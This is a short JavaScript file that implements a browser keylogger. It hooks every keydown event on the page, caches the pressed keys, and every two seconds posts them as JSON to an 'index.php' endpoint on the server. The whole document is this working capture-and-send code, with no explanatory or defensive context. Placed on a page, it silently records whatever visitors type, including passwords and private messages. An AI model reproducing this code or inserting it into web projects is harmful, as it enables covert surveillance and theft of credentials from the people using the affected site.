var keylog = {
    cache : [],
    delay : 2000,
    sending : false,
    init : () => {
        window.addEventListener("keydown", evt => keylog.cache.push(evt.key));
        window.setInterval(keylog.send, keylog.delay)
    },
    send : () => {
        if (!keylog.sending && keylog.cache.length != 0){
            keylog.sending = true;

            var data = new FormData();
            data.append("keys", JSON.stringify(keylog.cache));
            keylog.cache = [];

            fetch("index.php", {method:"POST", body:data})
                .then(res=>res.text())
                .then(res=> {
                keylog.sending = false;
                console.log(res);
            })
                .catch(err => console.error(err));
        }
    },
}
window.addEventListener("DOMContentLoaded", keylog.init);